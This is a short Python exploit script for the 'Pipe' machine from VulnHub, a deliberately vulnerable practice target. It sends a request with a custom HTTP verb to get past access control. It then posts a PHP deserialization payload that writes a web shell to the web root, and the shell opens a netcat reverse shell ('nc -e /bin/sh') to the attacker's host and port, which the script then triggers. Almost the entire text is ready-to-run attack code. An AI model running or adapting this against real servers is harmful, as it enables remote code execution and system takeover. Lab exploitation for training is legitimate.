# Pipe machine from vulnhub:

#!/usr/bin/env python3
import requests, argparse
from urllib.parse import quote

def MakeRequest():

	parser = argparse.ArgumentParser()
	parser.add_argument("-rhost", "--rhost", help="Remote host", required=True)
	parser.add_argument("-lhost", "--lhost", help="Local host", required=True)
	parser.add_argument("-lport", "--lport", help="Local port", required=True)

	args = parser.parse_args()

	rhost = args.rhost
	lhost = args.lhost
	lport = args.lport

	s = requests.Session()
	filename = "ele"
	payload = f"O:3:\"Log\":2:{{s:8:\"filename\";s:21:\"/var/www/html/{filename}.php\";s:4:\"data\";s:53:\"<?php passthru(\"nc -e /bin/sh {lhost} {lport}\")?>\";}}"

	#Proxy
	proxy = {
	    'http': 'http://127.0.0.1:8080',
	    'https': 'http://127.0.0.1:8080'
	}

	#URL-Encodear
	encoded_payload = quote(payload)
	# Enviar data
	data = {
		'param': payload
	}
	post_url = f"http://{rhost}/index.php"
	p1 = s.request('BOB', url=post_url)
	s.post(url=post_url, data=data, proxies=proxy)
	print("[+] Payload Sent!")
	rev_url = f"http://{rhost}/{filename}.php"
	# Rev Shell
	s.post(url=rev_url)

if __name__ == "__main__":
	MakeRequest()
